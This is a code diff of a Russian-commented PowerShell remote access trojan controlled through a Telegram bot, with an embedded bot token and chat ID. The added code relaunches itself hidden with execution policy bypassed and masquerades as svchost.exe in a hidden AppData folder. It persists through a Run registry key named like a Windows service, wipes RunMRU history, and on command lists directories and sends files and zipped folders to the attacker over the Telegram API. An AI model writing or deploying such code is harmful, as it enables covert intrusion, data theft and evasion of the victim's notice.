@@ -1,4 +1,4 @@
-# RAT через Telegram Bot - АДАПТИРОВАННЫЙ ДЛЯ WINDOWS 10/11
+# RAT через Telegram Bot - ПОЛНОСТЬЮ СКРЫТАЯ ВЕРСИЯ
 $Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
 $ChatID = "5674514050"
 
@@ -11,17 +11,30 @@ Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 
-# Полное скрытие окна PowerShell для Windows 10/11
-try {
-    $signature = @'
-    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
-    [DllImport("user32.dll")] public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
-'@
-    $WindowAPI = Add-Type -MemberDefinition $signature -Name WinAPI -Namespace Windows -PassThru
-    $consolePtr = $WindowAPI::GetConsoleWindow()
-    [Windows.WinAPI]::ShowWindow($consolePtr, 0) | Out-Null
-} catch { }
+# ПОЛНОЕ СКРЫТИЕ ОКНА - запускаем новый скрытый процесс и завершаем текущий
+if (-not $global:Restarted) {
+    $global:Restarted = $true
+    
+    # Сохраняем скрипт во временный файл
+    $tempScript = [System.IO.Path]::GetTempFileName() + ".ps1"
+    $currentContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
+    $currentContent | Out-File -FilePath $tempScript -Encoding UTF8
+    
+    # Запускаем новый полностью скрытый процесс
+    $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
+    $processStartInfo.FileName = "powershell.exe"
+    $processStartInfo.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$tempScript`""
+    $processStartInfo.CreateNoWindow = $true
+    $processStartInfo.UseShellExecute = $false
+    $processStartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+    
+    $process = New-Object System.Diagnostics.Process
+    $process.StartInfo = $processStartInfo
+    $process.Start() | Out-Null
+    
+    # Завершаем текущий видимый процесс
+    exit
+}
 
 # Очистка истории RUN при запуске
 try {
@@ -43,17 +56,9 @@ function Send-Telegram {
     }
     
     try {
-        $jsonBody = $body | ConvertTo-Json
-        $response = Invoke-RestMethod -Uri $url -Method Post -Body $jsonBody -ContentType "application/json; charset=utf-8" -UseBasicParsing
+        Invoke-RestMethod -Uri $url -Method Post -Body $body -UseBasicParsing | Out-Null
     } catch { 
-        try {
-            # Альтернативный метод с формой
-            $form = @{
-                chat_id = $ChatID
-                text = $Message
-            }
-            $response = Invoke-RestMethod -Uri $url -Method Post -Body $form -UseBasicParsing
-        } catch { }
+        # Молча игнорируем ошибки отправки
     }
     
     if ($FilePath -and (Test-Path $FilePath)) {
@@ -87,17 +92,7 @@ function Send-TelegramFile {
 
         Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines -UseBasicParsing
     } catch {
-        try {
-            # Резервный метод отправки файла
-            $fileInfo = Get-Item $FilePath
-            $fileStream = [System.IO.File]::OpenRead($FilePath)
-            $form = @{
-                chat_id = $ChatID
-                document = $fileStream
-            }
-            Invoke-RestMethod -Uri $url -Method Post -Form $form -UseBasicParsing
-            $fileStream.Close()
-        } catch { }
+        # Молча игнорируем ошибки отправки файлов
     }
 }
 
@@ -109,21 +104,11 @@ function Compress-Folder {
         [System.IO.Compression.ZipFile]::CreateFromDirectory($FolderPath, $ZipPath, [System.IO.Compression.CompressionLevel]::Fastest, $false)
         return $true
     } catch {
-        try {
-            # Резервный метод архивации через COM
-            $shell = New-Object -ComObject Shell.Application
-            $zipFolder = $shell.NameSpace($ZipPath)
-            $sourceFolder = $shell.NameSpace($FolderPath)
-            $zipFolder.CopyHere($sourceFolder.Items())
-            Start-Sleep -Seconds 3
-            return $true
-        } catch {
-            return $false
-        }
+        return $false
     }
 }
 
-# Функция очистки RAT (интегрированный cleanup.ps1)
+# Функция очистки RAT
 function Invoke-Cleanup {
     # Отправляем начало очистки
     Send-Telegram "🔍 Начинается полная очистка RAT..."
@@ -140,7 +125,7 @@ function Invoke-Cleanup {
     foreach ($process in $processes) {
         try {
             $cmdLine = (Get-WmiObject Win32_Process -Filter "ProcessId = $($process.Id)").CommandLine
-            if ($cmdLine -like "*WindowsSystem*" -or $cmdLine -like "*svchost.exe*" -or $cmdLine -like "*Windows Defender Security*" -or $cmdLine -like "*spoolsv.exe*" -or $cmdLine -like "*8429674512*") {
+            if ($cmdLine -like "*WindowsSystem*" -or $cmdLine -like "*svchost.exe*" -or $cmdLine -like "*Windows Defender Security*" -or $cmdLine -like "*spoolsv.exe*" -or $cmdLine -like "*WindowsLogs*" -or $cmdLine -like "*8429674512*") {
                 Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
             }
         } catch { }
@@ -155,7 +140,7 @@ function Invoke-Cleanup {
         "$env:TEMP\cleanup_*.ps1",
         "$env:WINDIR\System32\drivers\etc\hosts_backup\spoolsv.exe",
         "$env:TEMP\rat_installed.marker",
-        "$env:APPDATA\Microsoft\Windows\System32Logs\svchost.exe",
+        "$env:APPDATA\Microsoft\WindowsLogs\svchost.exe",
         "$env:TEMP\windows_update.marker"
     )
 
@@ -194,10 +179,10 @@ function Invoke-Cleanup {
                 $regEntries += "$regPath\Windows Audio Service"
             }
             
-            $value3 = Get-ItemProperty -Path $regPath -Name "System32 Logs Service" -ErrorAction SilentlyContinue
+            $value3 = Get-ItemProperty -Path $regPath -Name "Windows Logs Service" -ErrorAction SilentlyContinue
             if ($value3) {
-                Remove-ItemProperty -Path $regPath -Name "System32 Logs Service" -Force -ErrorAction SilentlyContinue
-                $regEntries += "$regPath\System32 Logs Service"
+                Remove-ItemProperty -Path $regPath -Name "Windows Logs Service" -Force -ErrorAction SilentlyContinue
+                $regEntries += "$regPath\Windows Logs Service"
             }
         } catch { }
     }
@@ -223,70 +208,252 @@ $($regEntries -join "`n")
     return $true
 }
 
-# Установка в автозагрузку с улучшенной маскировкой для Windows 10/11
+# Установка в автозагрузку
 $installMarker = "$env:TEMP\windows_update.marker"
 
 # Проверяем, не установлен ли уже RAT
 if (!(Test-Path $installMarker)) {
-    # Создаем маркер установки с безобидным именем
+    # Создаем маркер установки
     "Windows Update Helper - $(Get-Date)" | Out-File -FilePath $installMarker -Encoding UTF8
     
-    # Новая скрытая папка в AppData (не требует прав администратора)
-    $hiddenFolder = "$env:APPDATA\Microsoft\Windows\System32Logs"
+    # Скрытая папка в AppData
+    $hiddenFolder = "$env:APPDATA\Microsoft\WindowsLogs"
     if (!(Test-Path $hiddenFolder)) { 
-        New-Item -Path $hiddenFolder -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
-        # Скрываем папку системными атрибутами
-        attrib +s +h +r "$hiddenFolder" 2>&1 | Out-Null
+        New-Item -Path $hiddenFolder -ItemType Directory -Force | Out-Null
+        attrib +h "$hiddenFolder" 2>&1 | Out-Null
     }
     
     $scriptPath = "$hiddenFolder\svchost.exe"
     
-    # Копируем скрипт только если его там нет
-    if (!(Test-Path $scriptPath)) {
-        try {
-            # Получаем содержимое текущего скрипта
-            $currentScript = $MyInvocation.MyCommand.ScriptBlock
-            if ($null -eq $currentScript) {
-                # Альтернативный метод получения скрипта
-                $currentScript = Get-Content -Path $PSCommandPath -Raw -ErrorAction SilentlyContinue
-            }
-            if ($null -ne $currentScript) {
-                $currentScript | Out-File -FilePath $scriptPath -Encoding UTF8 -ErrorAction SilentlyContinue
-                # Устанавливаем скрытые атрибуты на файл
-                attrib +s +h +r "$scriptPath" 2>&1 | Out-Null
-            }
-        } catch {
-            # Если не удалось получить скрипт, создаем минимальную версию
-            $basicScript = @"
-# Минимальная версия RAT
-`$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
-`$ChatID = "5674514050"
-while(`$true) { try { Start-Sleep -Seconds 10 } catch { } }
-"@
-            $basicScript | Out-File -FilePath $scriptPath -Encoding UTF8 -ErrorAction SilentlyContinue
-            attrib +s +h +r "$scriptPath" 2>&1 | Out-Null
-        }
-    }
+    # Сохраняем текущий скрипт в новое место
+    $currentScriptContent = @'
+# RAT через Telegram Bot - СКРЫТАЯ ВЕРСИЯ
+$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
+$ChatID = "5674514050"
+
+[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+$PSDefaultParameterValues['*:Encoding'] = 'utf8'
+
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+
+# Очистка истории RUN
+try {
+    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
+} catch { }
+
+function Send-Telegram {
+    param([string]$Message, [string]$FilePath = $null)
     
-    # Установка в автозагрузку с новым маскированным именем
-    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    if (!(Test-Path $regPath)) { 
-        New-Item -Path $regPath -Force -ErrorAction SilentlyContinue | Out-Null 
-    }
+    $lastMessage = $global:LastSentMessage
+    if ($Message -eq $lastMessage) { return }
+    $global:LastSentMessage = $Message
     
-    # Новое маскированное имя для реестра
-    $uniqueName = "System32 Logs Service"
-    Set-ItemProperty -Path $regPath -Name $uniqueName -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
+    $url = "https://api.telegram.org/bot$Token/sendMessage"
+    $body = @{ chat_id = $ChatID; text = $Message }
     
-    # Дополнительная установка в планировщик задач для большей надежности
     try {
-        $taskName = "WindowsSystemLogs"
-        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
-        $trigger = New-ScheduledTaskTrigger -AtLogOn
-        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd
-        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Description "System logs collection service" -Force -ErrorAction SilentlyContinue | Out-Null
+        Invoke-RestMethod -Uri $url -Method Post -Body $body -UseBasicParsing | Out-Null
+    } catch { }
+    
+    if ($FilePath -and (Test-Path $FilePath)) {
+        Send-TelegramFile -FilePath $FilePath
+    }
+}
+
+function Send-TelegramFile {
+    param([string]$FilePath)
+    
+    $url = "https://api.telegram.org/bot$Token/sendDocument"
+    
+    try {
+        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
+        $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
+        $boundary = [System.Guid]::NewGuid().ToString()
+
+        $bodyLines = (
+            "--$boundary", "Content-Disposition: form-data; name=`"chat_id`"", "", $ChatID,
+            "--$boundary", "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
+            "Content-Type: application/octet-stream", "", $fileEnc, "--$boundary--"
+        ) -join "`r`n"
+
+        Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines -UseBasicParsing
     } catch { }
 }
+
+function Compress-Folder {
+    param([string]$FolderPath, [string]$ZipPath)
+    try {
+        [System.IO.Compression.ZipFile]::CreateFromDirectory($FolderPath, $ZipPath, [System.IO.Compression.CompressionLevel]::Fastest, $false)
+        return $true
+    } catch { return $false }
+}
+
+function Invoke-Cleanup {
+    Send-Telegram "🔍 Начинается полная очистка RAT..."
+    Send-Telegram "🔄 Этап 1: Завершение процессов RAT"
+
+    $processes = Get-Process | Where-Object { $_.ProcessName -eq "powershell" -or $_.ProcessName -eq "pwsh" -or $_.ProcessName -eq "cmd" }
+    foreach ($process in $processes) {
+        try {
+            $cmdLine = (Get-WmiObject Win32_Process -Filter "ProcessId = $($process.Id)").CommandLine
+            if ($cmdLine -like "*8429674512*" -or $cmdLine -like "*WindowsLogs*" -or $cmdLine -like "*svchost.exe*") {
+                Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
+            }
+        } catch { }
+    }
+
+    $filesToDelete = @(
+        "$env:APPDATA\Microsoft\WindowsLogs\svchost.exe",
+        "$env:TEMP\windows_update.marker"
+    )
+
+    $deletedFiles = @()
+    foreach ($filePattern in $filesToDelete) {
+        try {
+            Get-ChildItem -Path $filePattern -ErrorAction SilentlyContinue | ForEach-Object {
+                Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
+                $deletedFiles += $_.FullName
+            }
+        } catch { }
+    }
+
+    $regPaths = @("HKCU:\Software\Microsoft\Windows\CurrentVersion\Run", "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
+    $regEntries = @()
+    foreach ($regPath in $regPaths) {
+        try {
+            Remove-ItemProperty -Path $regPath -Name "Windows Logs Service" -Force -ErrorAction SilentlyContinue
+            $regEntries += "$regPath\Windows Logs Service"
+        } catch { }
+    }
+
+    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
+
+    $report = "✅ ОЧИСТКА RAT ЗАВЕРШЕНА`nУдаленные файлы:`n$($deletedFiles -join "`n")`nУдаленные записи реестра:`n$($regEntries -join "`n")"
+    Send-Telegram $report
+    return $true
+}
+
+# Основные переменные
+$currentDir = "C:\"
+$global:LastSentMessage = ""
+$global:LastUpdateId = 0
+
+# Очистка истории сообщений
+try {
+    $clearUrl = "https://api.telegram.org/bot$Token/getUpdates?offset=-1"
+    Invoke-RestMethod -Uri $clearUrl -Method Get -UseBasicParsing | Out-Null
+} catch { }
+
+Send-Telegram "RAT активирован на $env:COMPUTERNAME`nДоступные команды:`n/help - список команд`n/ls - список файлов`n/cd [папка] - сменить директорию`n/download [файл] - скачать файл`n/destroy - самоуничтожение"
+
+while ($true) {
+    try {
+        $offset = if ($global:LastUpdateId) { $global:LastUpdateId + 1 } else { 0 }
+        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset&timeout=60" -Method Get -UseBasicParsing
+        
+        if ($updates.ok -and $updates.result.Count -gt 0) {
+            foreach ($update in $updates.result) {
+                $global:LastUpdateId = $update.update_id
+                
+                if ($update.message.chat.id -eq $ChatID) {
+                    $command = $update.message.text
+                    
+                    switch -regex ($command) {
+                        "^/help$" {
+                            Send-Telegram "Доступные команды:`n/help - показать это сообщение`n/ls - список файлов в текущей директории`n/cd [папка] - сменить директорию`n/download [файл] - скачать файл или папку`n/destroy - самоуничтожение RAT"
+                        }
+                        "^/ls$" {
+                            $items = Get-ChildItem -Path $currentDir -Force
+                            $fileList = @()
+                            foreach ($item in $items) {
+                                $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
+                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
+                                $fileList += "$type $($item.Name)$size"
+                            }
+                            Send-Telegram "Содержимое $currentDir`n$($fileList -join "`n")"
+                        }
+                        "^/cd (.+)$" {
+                            $newDir = $matches[1].Trim()
+                            if ($newDir -eq "..") {
+                                $currentDir = Split-Path $currentDir -Parent
+                                if (!$currentDir) { $currentDir = "C:\" }
+                            } else {
+                                $testPath = Join-Path $currentDir $newDir
+                                if (Test-Path $testPath -PathType Container) {
+                                    $currentDir = $testPath
+                                } else {
+                                    Send-Telegram "Директория не найдена: $newDir"
+                                    continue
+                                }
+                            }
+                            
+                            $items = Get-ChildItem -Path $currentDir -Force
+                            $fileList = @()
+                            foreach ($item in $items) {
+                                $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
+                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
+                                $fileList += "$type $($item.Name)$size"
+                            }
+                            Send-Telegram "/ls $currentDir`n$($fileList -join "`n")"
+                        }
+                        "^/download (.+)$" {
+                            $target = $matches[1].Trim()
+                            $fullPath = Join-Path $currentDir $target
+                            
+                            if (Test-Path $fullPath) {
+                                if (Test-Path $fullPath -PathType Container) {
+                                    $zipPath = "$env:TEMP\$([System.IO.Path]::GetRandomFileName()).zip"
+                                    if (Compress-Folder -FolderPath $fullPath -ZipPath $zipPath) {
+                                        Send-Telegram "Папка $target заархивирована" $zipPath
+                                        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+                                    } else {
+                                        Send-Telegram "Ошибка архивации папки: $target"
+                                    }
+                                } else {
+                                    Send-Telegram "Файл $target отправлен" $fullPath
+                                }
+                            } else {
+                                Send-Telegram "Файл/папка не найдены: $target"
+                            }
+                        }
+                        "^/destroy$" {
+                            Send-Telegram "🔄 Запуск процедуры самоуничтожения..."
+                            try {
+                                $cleanupResult = Invoke-Cleanup
+                                if ($cleanupResult) {
+                                    Start-Sleep -Seconds 3
+                                    Stop-Process -Id $pid -Force
+                                }
+                            } catch {
+                                Send-Telegram "❌ Ошибка при самоуничтожении"
+                                try {
+                                    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
+                                    Stop-Process -Id $pid -Force
+                                } catch { }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    } catch { 
+        Start-Sleep -Seconds 5
+    }
+}
+'@
+
+    $currentScriptContent | Out-File -FilePath $scriptPath -Encoding UTF8
+    attrib +h "$scriptPath" 2>&1 | Out-Null
+}
+
+# Установка в автозагрузку
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
+
+$uniqueName = "Windows Logs Service"
+Set-ItemProperty -Path $regPath -Name $uniqueName -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:APPDATA\Microsoft\WindowsLogs\svchost.exe`"" -Force -ErrorAction SilentlyContinue
 
 # Основные переменные
 $currentDir = "C:\"
@@ -405,7 +572,7 @@ $($fileList -join "`n")"
                                 }
                                 
                             } catch {
-                                Send-Telegram "❌ Ошибка при самоуничтожении"
+                                Send-Telegram "❌ Ошибка при самоуничтожении: $($_.Exception.Message)"
                                 
                                 # Аварийная очистка
                                 try {
